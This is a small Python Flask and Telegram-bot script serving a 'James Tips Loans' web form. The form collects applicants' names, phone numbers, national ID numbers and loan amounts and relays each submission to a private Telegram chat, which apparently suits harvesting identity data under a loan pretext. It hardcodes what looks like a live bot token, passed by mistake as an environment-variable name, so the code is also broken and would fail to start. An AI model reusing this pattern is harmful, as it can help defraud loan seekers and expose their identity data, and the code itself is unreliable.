import os
import requests
from flask import Flask, request, render_template_string
import telebot
from threading import Thread

BOT_TOKEN = os.getenv("8922430528:AAH2AquN-GYZSvtpvrugccYw_YYEUbfqAs")
CHAT_ID = os.getenv("CHAT_ID")

bot = telebot.TeleBot(BOT_TOKEN) if BOT_TOKEN else None
app = Flask(__name__)

FORM = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:sans-serif;background:#f4f6f9;padding:20px}
.card{max-width:420px;margin:30px auto;background:white;padding:25px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
input,select{width:100%;padding:13px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:14px;background:#0a7a44;color:white;border:none;border-radius:8px;font-weight:bold}
h2{text-align:center;color:#0a7a44}
</style></head><body>
<div class="card">
<h2>James Tips Loans</h2>
<form method="POST">
<input name="name" placeholder="Full Name" required>
<input name="phone" placeholder="Phone Number" required>
<input name="id" placeholder="ID Number" required>
<input name="amount" type="number" placeholder="Loan Amount KES" required>
<select name="duration" required>
<option value="">Duration</option><option>1 Month</option><option>3 Months</option><option>6 Months</option><option>12 Months</option>
</select>
<button>Submit Application</button>
<p style="font-size:12px;color:gray;text-align:center;margin-top:10px">We never ask for PIN or OTP</p>
</form></div></body></html>
"""

@app.route("/apply", methods=["GET","POST"])
def apply():
    if request.method == "POST":
        msg = f"📥 NEW LOAN\nName: {request.form.get('name')}\nPhone: {request.form.get('phone')}\nID: {request.form.get('id')}\nAmount: {request.form.get('amount')}\nDuration: {request.form.get('duration')}"
        if BOT_TOKEN and CHAT_ID:
            try: bot.send_message(CHAT_ID, msg)
            except: pass
        return "<h3 style='text-align:center;margin-top:60px'>✅ Received! We will contact you.</h3>"
    return render_template_string(FORM)

@app.route("/")
def home():
    return "James Tips is Live - Go to /apply"

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, f"Bot online. Form: https://james-tips.onrender.com/apply")

def run_bot():
    if bot: bot.infinity_polling()

Thread(target=lambda: app.run(host="0.0.0.0", port=10000)).start()
run_bot()